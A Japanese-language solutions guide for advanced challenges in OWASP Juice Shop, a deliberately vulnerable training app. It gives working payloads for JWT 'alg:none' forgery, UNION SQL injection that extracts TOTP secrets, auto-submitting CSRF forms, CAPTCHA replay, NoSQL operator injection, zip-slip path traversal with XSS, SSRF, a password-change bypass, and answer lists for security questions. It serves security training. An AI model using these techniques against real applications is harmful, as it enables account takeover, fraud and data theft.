# 高度な攻撃テクニック

このファイルには、基本的なSQLi/XSS以外の高度な攻撃手法をまとめています。

---

## 1. JWT（JSON Web Token）操作

### Unsigned JWT (難易度4)
**目標:** 存在しないユーザーの有効なJWTを偽造する

**手順:**
1. 通常のユーザーでログインしてJWTを取得
2. DevTools → Application → Local Storage → `token` を確認
3. https://jwt.io/ でJWTをデコード
4. ヘッダーの `alg` を `"none"` に変更:
```json
{"alg": "none", "typ": "JWT"}
```
5. ペイロードのメールを変更:
```json
{"email": "jwtn3d@juice-sh.op", ...}
```
6. Base64URLでエンコード（**注意:** `=` パディングを削除）
7. 新しいトークンを構成: `<header>.<payload>.` （署名なし）
8. このトークンを `Authorization: Bearer <token>` で使用

**Base64URLエンコード:**
```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
```

---

## 2. 2要素認証（TOTP）バイパス

### Two Factor Authentication (難易度5)
**目標:** wurstbrotのアカウントに2FAバイパスでログイン

**手順:**
1. SQLiでTOTPシークレットを抽出:
```
')) UNION SELECT id,email,password,totpsecret,5,6,7,8,9 FROM users--
```
2. wurstbrotのTOTPシークレットを見つける: `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH`
3. Google AuthenticatorでQRコードをスキャンせず、手動でキーを入力
4. SQLiでログイン: `wurstbrot@juice-sh.op'--`
5. 2FA画面で生成されたコードを入力

---

## 3. CSRF（Cross-Site Request Forgery）

### CSRF攻撃 (難易度3)
**目標:** 別オリジンからユーザー名を変更する

**前提条件:** Firefox 96.x以前、または `--disable-features=SameSiteByDefaultCookies` で起動したChrome

**手順:**
1. Juice Shopにログイン（被害者として）
2. http://htmledit.squarefree.com を同じブラウザで開く
3. 以下のHTMLを入力:
```html
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="CSRF_HACKED"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```
4. フォームが自動送信され、ユーザー名が変更される

---

## 4. CAPTCHAバイパス

### CAPTCHA Bypass (難易度3)
**目標:** 10秒以内に10件以上のフィードバックを送信

**手順:**
1. CAPTCHAを1回取得:
```javascript
const captcha = await fetch('/rest/captcha').then(r => r.json());
```
2. 同じcaptchaIdとanswerを使って複数回送信:
```javascript
for (let i = 0; i < 15; i++) {
  fetch('/api/Feedbacks/', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      captchaId: captcha.captchaId,
      captcha: eval(captcha.captcha).toString(),
      comment: `Spam ${i}`,
      rating: 1
    })
  });
}
```

**脆弱性:** CAPTCHAの答えは1回の検証後も再利用可能

---

## 5. 負の数量注文（Negative Order）

### Place Order That Makes You Rich (難易度5)
**目標:** 数量を負の値にして利益を得る

**手順:**
1. ログインして商品をカートに追加
2. カートアイテムのIDを確認（DevTools → Network）
3. PUT リクエストで数量を負の値に変更:
```javascript
fetch('/api/BasketItems/1', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({quantity: -100})
}).then(r => r.json()).then(console.log)
```
4. チェックアウトすると負の金額（返金）になる

---

## 6. NoSQLインジェクション

### NoSQL Manipulation (難易度4)
**目標:** 全てのレビューを一括変更

**手順:**
```javascript
fetch('/rest/products/reviews', {
  method: 'PATCH',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    id: {"$ne": -1},  // IDが-1でない全て
    message: "Hacked by NoSQLi!"
  })
}).then(r => r.json()).then(console.log)
```

**MongoDBオペレーター:**
- `$ne` - not equal
- `$gt` - greater than
- `$lt` - less than
- `$regex` - 正規表現マッチ

---

## 7. HTTP Parameter Pollution (HPP)

### Manipulate Basket (難易度3)
**目標:** 他のユーザーのカートに商品を追加

**手順:**
JSONで同じキーを2回指定:
```javascript
fetch('/api/BasketItems', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer YOUR_TOKEN'
  },
  body: '{"ProductId":1,"BasketId":"YOUR_ID","quantity":1,"BasketId":"2"}'
}).then(r => r.json()).then(console.log)
```

**仕組み:** 最初の`BasketId`は検証に使用され、2番目の`BasketId`が実際の操作に使用される

---

## 8. セキュリティ質問のブルートフォース

### Reset Morty's Password (難易度5)
**目標:** セキュリティの質問の答えをブルートフォース

**手順:**
1. Burp Suiteでパスワードリセットリクエストを傍受
2. Intruderに送信
3. ペイロード位置を`securityAnswer`に設定
4. 辞書ファイル（best1050.txt）を使用:
```
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```
5. ステータスコード200の応答を探す

**Mortyの答え:** Rick and Mortyのキャラクターに関連

---

## 9. Prototype Pollution

### Client-side Prototype Pollution
**目標:** `__proto__`を使ってオブジェクトプロトタイプを汚染

**ペイロード例:**
```javascript
// APIリクエストで
{
  "email": "test@test.com",
  "password": "test",
  "__proto__": {
    "isAdmin": true
  }
}
```

---

## 10. 非安全なデシリアライゼーション

### Blocked RCE DoS (難易度5)
**目標:** サーバーを無限に占有するRCEを実行

**注意:** Docker/Heroku環境では利用不可

**手順:**
1. `/api-docs` でSwagger UIを発見
2. `/rest/products/{id}/reviews` エンドポイントを確認
3. `orderLinesData`パラメータにペイロードを挿入
4. サーバーのDoS保護をトリガー

---

## 11. Zip Slip（パストラバーサル）

### Video XSS (難易度6)
**目標:** プロモ動画にXSSペイロードを埋め込む

**手順:**
1. 悪意のある.vttファイルを作成:
```
WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert('xss')</script>
```
2. パストラバーサルを含むZIPファイルを作成:
```bash
zip exploit.zip ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
```
3. `/#/complain` でZIPをアップロード
4. `/promotion` にアクセスしてXSSを確認

---

## 12. SSRF (Server-Side Request Forgery)

### SSRF Challenge (難易度6)
**目標:** サーバーに自身を攻撃させる

**手順:**
1. プロフィール画像URL機能を使用
2. 内部リソースへのURLを指定:
```
http://localhost:3000/solve/challenges/server-side?key=...
```

**脆弱なコード:** `profileImageUrlUpload.js`で入力URLの検証が不十分

---

## 13. パスワード変更の脆弱性

### Change Bender's Password (難易度5)
**脆弱なコード:**
```typescript
// changePassword.ts
if (currentPassword && hash(currentPassword) !== user.password) {
  return res.status(401).send('Current password is not correct.')
}
```

**問題:** `&&` 演算子により `currentPassword` が undefined の場合チェックをスキップ

**攻撃:**
```
GET /rest/user/change-password?new=hacked&repeat=hacked
```
`current` パラメータを省略するだけでバイパス

---

## 14. セキュリティ質問の答え一覧

| ユーザー | 質問 | 答え | 出典 |
|---------|------|------|------|
| bjoern@owasp.org | ペットの名前 | Zaya | Twitter @baborschnitzel |
| bender@juice-sh.op | 会社名 | Stop'n'Drop | Futurama |
| jim@juice-sh.op | 兄弟のミドルネーム | Samuel | Star Trek Wiki |
| john | 場所 | (EXIF GPS座標から) | Photo Wall |
| emma | 勤務先 | ITsec | Photo Wall |

---

## 15. 主要なAPIエンドポイント

| エンドポイント | メソッド | 脆弱性 |
|---------------|---------|--------|
| `/rest/products/search?q=` | GET | SQLi |
| `/api/Users` | POST | role injection |
| `/api/Feedbacks` | POST | UserId manipulation |
| `/api/BasketItems` | POST | HPP, quantity manipulation |
| `/api/Products/{id}` | PUT | 認証なし更新 |
| `/rest/user/change-password` | GET | 現在パスワードバイパス |
| `/rest/products/reviews` | PATCH | NoSQLi |
| `/profile` | POST | CSRF |
| `/rest/captcha` | GET | 再利用可能 |

---

## 参考リンク
- [Pwning OWASP Juice Shop](https://pwning.owasp-juice.shop/)
- [公式ソリューション](https://help.owasp-juice.shop/appendix/solutions.html)
- [Curiosity Kills Colby](https://curiositykillscolby.com/tag/juice-shop/)
- [Whyiest Juice Shop Write-up](https://github.com/Whyiest/Juice-Shop-Write-up)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
